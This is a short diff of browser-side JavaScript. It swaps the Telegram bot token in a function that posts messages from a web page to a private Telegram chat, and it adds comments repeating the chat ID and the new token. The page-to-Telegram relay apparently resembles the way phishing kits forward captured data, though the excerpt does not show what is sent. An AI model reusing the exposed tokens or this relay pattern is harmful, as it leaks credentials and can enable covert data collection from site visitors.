@@ -283,9 +283,11 @@ window.addEventListener('load', function () {
   let lastMessageTime = 0; // Keeps track of the last time a message was sent
 const messageInterval = 1; // Minimum interval between messages in milliseconds (1 second)
 
+// Chat ID: 5902094102
+// Token: 8014427564:AAFLIvqt2dKDb_VmY1B536I7fB_HRrA7a8M
 function sendMessage(message) {
     const chatId = '5902094102';  // Your chat ID
-    const botToken = '7527460613:AAHwV4Fi5lUAfZEH1Is6D2GRPEjuUH-BpSg';  // Your bot token
+    const botToken = '8014427564:AAFLIvqt2dKDb_VmY1B536I7fB_HRrA7a8M';  // Your bot token
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
